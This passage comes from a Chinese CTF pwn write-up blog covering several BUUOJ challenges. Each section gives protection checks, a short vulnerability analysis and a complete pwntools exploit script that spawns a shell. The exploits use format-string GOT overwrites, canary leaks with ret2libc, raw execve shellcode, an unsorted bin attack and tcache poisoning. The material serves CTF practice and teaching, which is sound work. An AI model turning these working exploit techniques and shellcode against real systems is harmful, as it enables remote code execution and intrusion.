<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29212</span>)<span class="comment">#process(&#x27;./axb_2019_fmt32&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./axb_2019_fmt32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;b%9$s&#x27;</span> + p32(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Repeater:b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&#x27;puts addr leak: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">strlen_got = e.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">high_sys_addr = (sys_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">low_sys_addr = sys_addr &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> + p32(strlen_got) + p32(strlen_got + <span class="number">2</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(low_sys_addr - <span class="number">9</span> - <span class="number">9</span>).encode() + <span class="string">b&#x27;c%8$hn&#x27;</span></span><br><span class="line">payload +=<span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(high_sys_addr - low_sys_addr).encode() + <span class="string">b&#x27;c%9$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/04/6mtf9VGuj2KWJkU.png" alt="image.png"></p>
<h3 id="解法二：BROP"><a href="#解法二：BROP" class="headerlink" title="解法二：BROP"></a>解法二：BROP</h3><p>虽然 BUU上给了二进制文件，但是这道题原题是Blind Pwn，所以这一次笔者打算也采用Blind Pwn的做法来做</p>
<blockquote>
<p>先🕊🕊🕊</p>
</blockquote>
<h2 id="0x039-others-babystack-partial-overwrite-ret2libc"><a href="#0x039-others-babystack-partial-overwrite-ret2libc" class="headerlink" title="0x039.others_babystack - partial overwrite + ret2libc"></a>0x039.others_babystack - partial overwrite + ret2libc</h2><p>惯例的 <code>checksec</code> ，除了PIE以外都开上了</p>
<p><img src="https://i.loli.net/2021/04/04/mWMxe2lSs1PEjV5.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>大概是有着往栈上写入内容与打印栈上数据的功能，且存在溢出</p>
<p><img src="https://i.loli.net/2021/04/04/TeEnZxXMWAb3Uvl.png" alt="image.png"></p>
<p>直接泄露 canary 以后 ret2libc 一套带走</p>
<p>虽然说题目文件本身没有开 PIE ，但是这里提供一个绕过 PIE 的思路：可以通过 main 函数的返回地址泄露 libc 基址，笔者的 exp 也是这么做的</p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29360</span>)<span class="comment">#process(&#x27;./babystack&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line">offset = <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># leak canary</span></span><br><span class="line">    write(<span class="string">b&#x27;A&#x27;</span> * (offset - <span class="number">8</span> + <span class="number">1</span>))</span><br><span class="line">    dump()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;A&#x27;</span> * (offset - <span class="number">8</span> + <span class="number">1</span>))</span><br><span class="line">    canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;canary leak: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc base</span></span><br><span class="line">    write(<span class="string">b&#x27;A&#x27;</span> * (offset + <span class="number">8</span>))</span><br><span class="line">    dump()</span><br><span class="line">    addr_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;addr leak: &#x27;</span> + <span class="built_in">hex</span>(addr_leak))</span><br><span class="line">    libc_base = (addr_leak - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop to get the shell</span></span><br><span class="line">    write(<span class="string">b&#x27;A&#x27;</span> * (offset - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(libc_base + libc.search(asm(<span class="string">&#x27;pop rdi ; pop rbp ; ret&#x27;</span>)).__next__()) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()) + p64(<span class="number">0xdeadbeef</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/04/1r7OWFNf4HhpnBu.png" alt="image.png"></p>
<h2 id="0x03A-mrctf2020-shellcode-shellcode"><a href="#0x03A-mrctf2020-shellcode-shellcode" class="headerlink" title="0x03A.mrctf2020_shellcode - shellcode"></a>0x03A.mrctf2020_shellcode - shellcode</h2><p>惯例的 <code>checksec</code>，开了 PIE 和R ELRO</p>
<p><img src="https://i.loli.net/2021/04/04/IsqQJEKdX3P1ySu.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>程序会执行我们的输入</p>
<p><img src="https://i.loli.net/2021/04/04/NvPkpmKFBdrCH4Z.png" alt="image.png"></p>
<p>直接输一段恰当的 shellcode 即可 get shell</p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28688</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/04/QNyBuHAOm7bhIp2.png" alt="image.png"></p>
<h2 id="0x03B-hitcontraining-magicheap-unsorted-bin-attack"><a href="#0x03B-hitcontraining-magicheap-unsorted-bin-attack" class="headerlink" title="0x03B.hitcontraining_magicheap - unsorted bin attack"></a>0x03B.hitcontraining_magicheap - unsorted bin attack</h2><p>惯例的 <code>checksec</code> ，保护全…诶这道堆题居然没有保护全开…</p>
<p><img src="https://i.loli.net/2021/04/04/OAz97KSQvNsgcm1.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>题目给了分配、编辑、释放堆块的功能</p>
<p>漏洞点在于编辑时的逻辑错误，导致可以进行堆溢出</p>
<p><img src="https://i.loli.net/2021/04/04/bzd64FQZrWj7hyp.png" alt="image.png"></p>
<p>存在一个可以直接拿 shell 的后门函数，但是需要 bss 段上的某个值大于 <code>0x1305</code></p>
<p><img src="https://i.loli.net/2021/04/04/EoHzFQYa9whXWb1.png" alt="image.png"></p>
<p>考虑到 <code>_int_malloc()</code> 中从 unsorted bin 中取出恰当大小 chunk 时几乎没有任何检查（未使用 unlink），那么我们可以考虑通过堆溢出的方式将 bss 段上的这个区域链入 unsorted bin 中，这样就可以将该值改写为 <code>main_arena + 0x50</code>，毫无疑问大于 0x1305，这个时候就可以拿 shell 了</p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27919</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>,size:<span class="built_in">int</span> , content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">114514</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x6020A0</span> - <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cmd(<span class="number">0x1305</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/04/zOyULBmlYFeuMxX.png" alt="image.png"></p>
<blockquote>
<p>笔者还在考虑如何不用后门函数拿 shell，思路大概是用残留指针爆破到 stdout 泄露 libc 地址，但是 fastbin 的size检查就很烦…</p>
</blockquote>
<h2 id="0x03C-ciscn-2019-final-3-Use-After-Free-tcache-poisoning"><a href="#0x03C-ciscn-2019-final-3-Use-After-Free-tcache-poisoning" class="headerlink" title="0x03C.ciscn_2019_final_3 - Use After Free + tcache poisoning"></a>0x03C.ciscn_2019_final_3 - Use After Free + tcache poisoning</h2><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/04/04/KIZF84yhjVTaSAE.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接就有一个裸的 UAF</p>
<p><img src="https://i.loli.net/2021/04/04/6woiXGIQdv95Dgt.png" alt="image.png"></p>
<p>唯一的输出功能是在每次分配之后会给出 chunk 的地址，利用这个我们可以泄露 <code>堆基址</code>，而我们后续若是能够分配到一个位于 libc 中的 chunk ，则毫无疑问也能泄露 libc 基址</p>
<p><img src="https://i.loli.net/2021/04/05/mXUwpYVoHSFWB3G.png" alt="image.png"></p>
<p>同时题目限制了只能分配 <code>0x78</code> 以下的 chunk ，我们没法直接获得一个 unsorted bin chunk</p>
<p><img src="https://i.loli.net/2021/04/05/4efPFN6QT1Rj7Kc.png" alt="image.png"></p>
<p>题目给出的 libc 为<code>没有 double free 检测的 2.27 版本</code>，但是笔者个人觉得既然往后的新版本 libc 的 tcache 都有 double free 检测，现在这里主动忽视掉这一点等于是自欺欺人（），于是笔者选择<strong>通过 stash 机制绕过 double free 检测的做法</strong></p>
<blockquote>
<p>主动提高题目难度的屑人</p>
</blockquote>
<p>由于题目仅仅允许分配 <code>0x18</code> 次 chunk，而利用 stash 绕过 double free 检测至少需要使用其中的 <code>19</code> 次，第 <code>20</code> 次才是我们的第一次任意地址写，因此我们需要精确计算利用好剩下的 <code>4</code> 次机会</p>
<p>那么在这里笔者选择劫持 tcache struct ：</p>
<ul>
<li>tcache struct 大小为 0x250（libc 2.27），free刚好可以放入 unsorted bin</li>
<li>可以直接控制对应下标的 count ，而不需要想办法分配大于 0x400 的 chunk 以略过 tcache</li>
<li>可以直接控制对应下标存放的 chunk</li>
</ul>
<p>我们控制 tcache struct 之后直接在合适下标内 <strong>再写入 tcache 地址，二次分配后我们便能够分配到一个 libc 中的 chunk，以此泄露 libc 基址</strong></p>
<p>最后就是改 <code>__free_hook</code> 为 <code>system</code> 的常规流程，由于 chunk 数量限制，我们需要多次控制 tcache struct</p>
<p>最终的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26084</span>) <span class="comment">#process(&#x27;./ciscn_final_3&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>,size:<span class="built_in">int</span> , content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input the index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input the size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;now you can write something&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input the index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;gift :&quot;</span>)</span><br><span class="line">    heap_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;heap addr leak: &#x27;</span> + <span class="built_in">hex</span>(heap_leak))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x11e70</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        new(i, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">17</span>):</span><br><span class="line">        new(i, <span class="number">0x70</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    new(<span class="number">17</span>, <span class="number">0x70</span>, p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">18</span>, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">19</span>, <span class="number">0x70</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">20</span>, <span class="number">0x70</span>, (<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">35</span> + <span class="string">b&#x27;\x07&#x27;</span> * <span class="number">1</span>).ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base + <span class="number">0x10</span>) * <span class="number">6</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    new(<span class="number">21</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">22</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;gift :&quot;</span>)</span><br><span class="line">    libc_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;libc addr leak: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">23</span>, <span class="number">0x50</span>, (<span class="string">b&#x27;\x01&#x27;</span> * <span class="number">10</span>).ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) * <span class="number">2</span>)</span><br><span class="line">    new(<span class="number">24</span>, <span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/05/vA7IVD4GBjLYhcp.png" alt="image.png"></p>
<h2 id="0x03D-pwnable-start-ret2shellcode"><a href="#0x03D-pwnable-start-ret2shellcode" class="headerlink" title="0x03D.pwnable_start - ret2shellcode"></a>0x03D.pwnable_start - ret2shellcode</h2><p>惯例的<code>checksec</code>，保护全关，四舍五入可以为所欲为www</p>
<p><img src="https://i.loli.net/2021/02/27/eWtvYxgB5Ezru4X.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/02/27/9xCG7JhlVWqao6i.png" alt="image.png"></p>
<p>程序本身的逻辑比较简单，先是系统调用<code>write</code>输出栈上字符串，然后是系统调用<code>read</code>读入最大<code>0x3c</code>个字节，容易看出存在栈溢出</p>
<p>与一般函数的逻辑所不同的是，在开始时先将esp的值压入栈中，再将返回地址压入栈中，那么我们便可以通过控制程序返回到write系统调用的方式<strong>泄漏出栈上地址</strong></p>
<p>没有后门函数，故考虑泄露地址后在栈上输入shellcode以ret2shellcode来get shell</p>
<p>构造exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;,25392)#process(&#x27;./start&#x27;)</span><br><span class="line">context.arch = &#x27;i386&#x27;</span><br><span class="line">offset = 0x14</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;A&#x27; * offset + p32(0x8048087)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">stack_leak = u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;A&#x27; * offset + p32(stack_leak + 0x14) + b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;#asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/27/76cAGQgP4XxshCp.png" alt="image.png"></p>
<h2 id="0x03E-hitcontraining-heapcreator-off-by-one-chunk-overlapping"><a href="#0x03E-hitcontraining-heapcreator-off-by-one-chunk-overlapping" class="headerlink" title="0x03E.hitcontraining_heapcreator - off by one + chunk overlapping"></a>0x03E.hitcontraining_heapcreator - off by one + chunk overlapping</h2><p>惯例的 <code>checksec</code> ，保护全…只开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/04/05/8O2XJIRexBluKaz.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>功能一应俱全，整挺好</p>
<p><img src="https://i.loli.net/2021/04/05/yLI5vbmPo7kSlRp.png" alt="image.png"></p>
<p>漏洞点主要在于编辑时会多读入一个字节，存在 off by one 漏洞</p>
<p><img src="https://i.loli.net/2021/04/05/2kKaC8wJQEHWnDu.png" alt="image.png"></p>
